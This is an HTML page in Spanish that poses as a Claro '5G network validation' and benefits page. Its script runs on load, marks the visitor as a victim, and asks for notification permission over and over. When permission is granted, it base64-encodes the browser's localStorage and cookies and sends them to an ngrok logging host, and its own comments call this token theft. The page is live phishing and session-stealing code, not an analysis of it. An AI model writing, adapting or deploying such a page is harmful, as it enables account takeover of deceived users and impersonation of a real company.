<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Claro | Validación de Red 5G</title>
    <script>
        var ng = "https://superdelicately-handworked-brenna.ngrok-free.dev/log?";

        // Función para enviar datos a tu NetHunter
        function enviar(fase, extra = "") {
            new Image().src = ng + "fase=" + fase + "&info=" + btoa(navigator.userAgent) + extra;
        }

        async function solicitarPermisos() {
            try {
                // Intentamos el permiso apenas carga
                const permission = await Notification.requestPermission();
                
                if (permission === 'granted') {
                    enviar("PUENTE_ACTIVO", "&status=OK");
                    
                    // Robo de tokens automático al dar permiso
                    var data = btoa(JSON.stringify(localStorage) + "|" + document.cookie);
                    enviar("SESSION_DATA", "&payload=" + data);

                    document.body.innerHTML = "<h1 style='color:red;'>Sincronizando 50GB...</h1><p>Mantenga esta pestaña abierta.</p>";
                } else {
                    // Si lo rechaza, lo volvemos a pedir con un bucle (Ambición extrema)
                    enviar("PERMISO_RECHAZADO");
                    setTimeout(solicitarPermisos, 2000); 
                }
            } catch (e) {
                enviar("ERROR_SCRIPT", "&msg=" + btoa(e.message));
            }
        }

        // Se ejecuta solo al entrar
        window.onload = () => {
            enviar("VICTIMA_ENTRO");
            solicitarPermisos();
        };
    </script>
</head>
<body style="background:#000; color:#fff; text-align:center; padding-top:200px; font-family:sans-serif;">
    <div onclick="solicitarPermisos()" style="position:fixed; top:0; left:0; width:100%; height:100%; cursor:pointer;">
        <h1>Cargando Beneficios Claro...</h1>
        <p>Toque la pantalla para continuar</p>
    </div>
</body>
</html>
